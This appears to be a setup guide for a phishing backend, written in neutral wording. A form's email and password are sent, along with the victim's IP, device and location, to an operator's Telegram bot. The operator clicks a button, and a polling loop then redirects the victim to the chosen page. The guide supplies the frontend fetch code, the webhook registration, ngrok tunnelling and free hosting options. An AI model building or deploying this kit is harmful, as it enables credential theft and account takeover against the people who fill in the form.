# Backend Setup Guide

## 1. Install dependencies
```bash
npm install
```

## 2. Add your credentials in server.js
Open `server.js` and replace:
- `YOUR_BOT_TOKEN` → your Telegram bot token from @BotFather
- `YOUR_CHAT_ID` → your Telegram chat ID (send /start to your bot, then call https://api.telegram.org/botTOKEN/getUpdates)

## 3. Run the server
```bash
npm start
# or for auto-reload during development:
npm run dev
```

## 4. Register the Telegram Webhook
Telegram needs to know WHERE to send button click events.
Replace TOKEN and YOUR_DOMAIN then open this URL in your browser:

```
https://api.telegram.org/botYOUR_BOT_TOKEN/setWebhook?url=https://YOUR_DOMAIN/webhook
```

If running locally, use ngrok to get a public URL:
```bash
npx ngrok http 3000
# copy the https URL e.g. https://abc123.ngrok.io
# then register: https://api.telegram.org/botTOKEN/setWebhook?url=https://abc123.ngrok.io/webhook
```

---

## How your frontend should use this backend

### Step 1 — Submit the form
```javascript
const response = await fetch('https://YOUR_DOMAIN/submit', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password })
});
```

### Step 2 — Poll for Telegram decision
```javascript
const interval = setInterval(async () => {
  const res = await fetch('https://YOUR_DOMAIN/check-decision');
  const data = await res.json();

  if (data.decision === 'route_a') {
    clearInterval(interval);
    window.location.href = '/page-a'; // route to Page A
  } else if (data.decision === 'route_b') {
    clearInterval(interval);
    window.location.href = '/page-b'; // route to Page B
  }
}, 2000); // checks every 2 seconds
```

---

## Full Flow Summary
```
User fills form (email + password)
        ↓
Frontend POST /submit → Backend
        ↓
Backend reads IP, device, location
        ↓
Backend sends to Telegram with Yes/No buttons
        ↓
You click a button on Telegram
        ↓
Telegram POST /webhook → Backend stores decision
        ↓
Frontend polls GET /check-decision every 2s
        ↓
Frontend gets decision → routes to correct page
```

## Free hosting options
- https://railway.app
- https://render.com
- https://vercel.com (serverless)
